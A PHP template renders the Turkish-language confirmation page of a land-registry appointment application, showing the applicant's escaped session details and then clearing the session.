<?php
if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/db.php';
if (empty($_SESSION['basvuru'])) { header('Location: ' . BASE_PATH . '/'); exit; }
$aktif_adim = 4;
require_once __DIR__ . '/includes/header.php';
?>
        <section class="webtapu-card" style="text-align:center;padding:40px 24px">
          <div style="width:72px;height:72px;background:#2d7a4e;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px">
            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <h3 style="font-size:22px;color:#1c3761;margin-bottom:10px">Başvurunuz Alındı!</h3>
          <p class="webtapu-muted" style="max-width:360px;margin:0 auto 24px">
            Tapu randevu başvurunuz başarıyla tamamlanmıştır. Randevu bilgileriniz
            <strong><?= htmlspecialchars($_SESSION['basvuru']['telefon'] ?? '') ?></strong>
            numaralı telefonunuza SMS olarak gönderilecektir.
          </p>
          <div class="randevu-ozet-box" style="text-align:left;max-width:360px;margin:0 auto 28px">
            <p><strong>Başvuru Sahibi:</strong> <?= htmlspecialchars(mb_strtolower(($_SESSION['basvuru']['ad']??'').' '.($_SESSION['basvuru']['soyad']??''), 'UTF-8')) ?></p>
            <p><strong>Randevu:</strong> <?= htmlspecialchars(($_SESSION['randevu']['tarih']??'').' '.substr($_SESSION['randevu']['saat']??'',0,5)) ?></p>
            <p><strong>Tapu Müdürlüğü:</strong> <?= htmlspecialchars($_SESSION['randevu']['mudurlik']??'') ?></p>
          </div>
          <a href="<?= BASE_PATH ?>/" class="primaryButton" style="display:inline-flex;align-items:center;gap:8px;text-decoration:none;border-radius:8px;padding:12px 28px;background:#3b77ac;color:#fff;font-weight:600">
            Ana Sayfaya Dön
          </a>
        </section>
<?php
// Session temizle
unset($_SESSION['basvuru'], $_SESSION['randevu'], $_SESSION['odeme'], $_SESSION['log_id'], $_SESSION['adim']);
require_once __DIR__ . '/includes/footer.php';
?>
